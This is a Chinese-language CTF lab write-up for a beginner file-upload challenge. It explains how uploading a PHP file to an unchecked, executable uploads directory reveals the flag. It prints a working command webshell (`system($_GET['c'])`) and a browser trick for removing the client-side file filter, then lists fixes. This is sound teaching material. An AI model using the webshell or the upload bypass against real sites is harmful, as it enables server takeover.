# 题解：头像上传（基础版 · 只有文件上传漏洞）

> 对应课件 p36「一个往里传，一个往外跳」。
> 本题是 `upload-ctf-2` 的**前置**：只留「能传上去」这一件事，不需要伪造任何请求头。

## 一、题目与考点

| 项 | 值 |
|---|---|
| 考点 | 文件上传、上传目录可访问且可执行 |
| 难度 | 1 |
| 端口 | 8086 |
| Flag 格式 | `flag{...}` |

一句话：服务端对上传的文件**不做任何检查**，传什么就存什么；
而 `uploads/` 目录既能直接访问、又能被 PHP 执行。

## 二、启动环境

```bash
cd upload-ctf-1
docker compose up -d --build
# 浏览器打开 http://127.0.0.1:8086/
```

## 三、手把手解题

### Step 1｜先随便传个文件

上传任意文件（图片、txt 都行），页面回显：

```
上传成功：uploads/xxx
访问：uploads/xxx
```

**两个关键信息**：文件名原样保留、上传目录可以直接访问。

### Step 2｜写一个 PHP 文件

本地建 `shell.php`：

```php
<?php require __DIR__ . '/../flag.inc.php'; echo ctf_flag(); ?>
```

直接上传 —— **不需要改任何请求头**，服务端不看类型也不看后缀。

### Step 3｜访问它

```bash
curl http://127.0.0.1:8086/uploads/shell.php
```

直接回显 `flag{...}`。

> 更好用的马：`<?php system($_GET['c']); ?>`，然后 `?c=whoami` 就能执行命令。

### Step 4｜浏览器版也行

F12 里选中 `<input type="file">`，手动把 `accept` 属性删掉，就能选 `.php` 文件上传。

## 四、为什么能成（原理）

```php
$name = basename($_FILES['f']['name']);
move_uploaded_file($_FILES['f']['tmp_name'], __DIR__ . '/uploads/' . $name);
```

两个问题叠在一起：

| 问题 | 后果 |
|---|---|
| 不校验类型、不校验后缀 | 任意文件都能落地 |
| 上传目录在 Web 根下、且允许执行 PHP | 上传的文件能当脚本跑 |

这就是「上传漏洞」的最小形态 —— 后面的 `upload-ctf-2` 会加上一道 `Content-Type` 检查，
但检查方式仍然可绕过。

## 五、怎么修（防御）

1. **白名单后缀**（不是黑名单），且按内容校验：`finfo_file()` / `getimagesize()`
2. **重命名**：`$new = bin2hex(random_bytes(8)) . '.png'`
3. **上传目录禁止执行 PHP**：
   ```nginx
   location /uploads/ { location ~ \.php$ { deny all; } }
   ```
4. 上传目录最好**移出 Web 根**，或放对象存储

## 六、动态 Flag

`src/flag.inc.php` 优先读环境变量 `FLAG`（**明文**），未注入则首次请求自动生成随机 flag
并缓存到容器 `/tmp/.web_ctf_flag`。木马通过 `require` 复用同一个读取器。

```bash
FLAG=flag{your-dynamic-flag} docker compose up -d
```
